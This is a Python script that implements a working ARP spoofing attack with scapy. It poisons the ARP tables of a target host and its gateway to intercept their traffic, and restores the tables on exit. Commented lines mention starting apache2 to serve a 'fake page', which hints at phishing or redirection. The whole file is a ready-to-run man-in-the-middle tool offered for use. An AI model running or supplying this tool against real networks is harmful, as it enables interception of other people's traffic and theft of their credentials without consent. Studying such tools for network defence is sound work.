#!/usr/bin/python3
"""
Dev: Prajwal Nautiyal
Date: 09 September 2023
---------------------------------
This is a simple ARP spoofing script.
It uses the scapy library to send and receive packets.
---------------------------------
ANSI escape codes:
    Red: \033[91m
    Green: \033[92m
    Yellow: \033[93m
    Clear: \033[0m
    Cyan Background: \033[48;5;51m
    Black Foreground: \033[38;5;0m
---------------------------------
"""

# Importing libraries
import argparse
import os
import sys
import time

import scapy.all as scapy

# Clearing the screen
os.system("clear")
# os.system("service apache2 start")            # Uncomment this line if you want to start the apache2 service to host the fake page


def getArgs() -> argparse.Namespace:
    """
    Function to get the arguments from the command line

    Returns:
        options: The arguments
    """
    parser = argparse.ArgumentParser()          # Creating the parser object
    # Adding the arguments
    parser.add_argument("-t", "--target", dest="target", help="Target IP / IP Range.", required=True)
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP.", required=True)
    options = parser.parse_args()               # Parsing the arguments
    # Checking if the arguments are valid
    if not options.target:
        parser.error("\033[91m[-] Please specify a target IP\n\033[93mUse --help for more info.\033[0m")
    elif not options.gateway:
        parser.error("\033[91m[-] Please specify a gateway IP\n\033[93mUse --help for more info.\033[0m")
    if options.target == options.gateway:
        parser.error("\033[91m[-] The target IP and the gateway IP cannot be the same.\033[0m")
    # Returning the arguments if they are valid
    return options


def getMAC(ip):
    """
    Function to get the MAC address of a device with the specified IP address

    Args:
        ip (str): The IP address of the device

    Returns:
        resultList[0][1].hwsrc: The MAC address of the device

    Raises:
        None
    """
    resultList = []                                                         # Creating an empty list
    arpRequest = scapy.ARP(pdst=ip)                                         # Creating an ARP request object
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")                        # Creating an Ethernet frame object
    arpBroadcast = broadcast/arpRequest                                     # Combining the ARP request and the Ethernet frame
    while len(resultList) == 0:                                             # Checking if the list is empty, and if it is, keep sending the packet
        resultList = scapy.srp(arpBroadcast, timeout=2, verbose=False)[0]   # Sending the packet and storing the response in the list
    return resultList[0][1].hwsrc                                           # Returning the MAC address extracted from the response


def spoof(targetIP, spoofIP, targetMAC):
    """ 
    Function to spoof the ARP table of the target device

    Args:
        targetIP (str): The IP address of the target device
        spoofIP (str): The IP address of the device whose MAC address we want to spoof (usually the gateway's IP address)
        targetMAC (str): The MAC address of the target device

    Returns:
        None

    Raises:
        None
    """
    # Creating the ARP response packet to send to the target device
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
    scapy.send(packet, verbose=False)


def restore(destinationIP, sourceIP):
    """
    Function to restore the ARP table of the target device to perform a clean exit

    Args:
        destinationIP (str): The IP address of the target device
        sourceIP (str): The IP address of the device whose MAC address we want to spoof (usually the gateway's IP address)

    Returns:
        None

    Raises:
        None
    """
    # Similar to the spoof function, but with the destination and source IP addresses swapped to the original values
    destinationMAC = getMAC(destinationIP)
    sourceMAC = getMAC(sourceIP)
    packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC)
    scapy.send(packet, count=4, verbose=False)

# Loading animation
loading = lambda i: print(f"\r|\033[48;5;51;38;5;0m{'>' * (i * 25 // 100)}\033[0m{' ' * (25 - (i * 25 // 100))}|", end="") or time.sleep(0.01)

def main():
    """
    Main function
    Exits when CTRL + C is pressed
    """
    options = getArgs()
    targetIP = options.target
    gatewayIP = options.gateway
    packetsCount = 0
    macResetTimer = 0
    targetMAC = getMAC(targetIP)
    gatewayMAC = getMAC(gatewayIP)
    try:
        print("\033[92m[+] ARP spoofing starting. Press CTRL + C to stop.\033[0m")
        list(map(loading, range(101)))
        while True:
            if macResetTimer == 600:
                targetMAC = getMAC(targetIP)
                gatewayMAC = getMAC(gatewayIP)
                macResetTimer = 0
            spoof(targetIP, gatewayIP, targetMAC)
            spoof(gatewayIP, targetIP, gatewayMAC)
            packetsCount = packetsCount + 2
            macResetTimer = macResetTimer + 2
            print(f"\r\033[92m[+] Packets sent:  {packetsCount}\033[0m", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n\033[93m[-] Detected CTRL + C ... Resetting ARP tables ... Please wait.\033[0m")
        restore(targetIP, gatewayIP)
        restore(gatewayIP, targetIP)
        list(map(loading, range(101)))
        # os.system("service apache2 stop")    # Uncomment this line if you started the apache2 service at the beginning of the script
        print("\033[92m[+] ARP tables restored. Quitting.\033[0m")
        sys.exit(0)

if __name__ == "__main__":
    main()
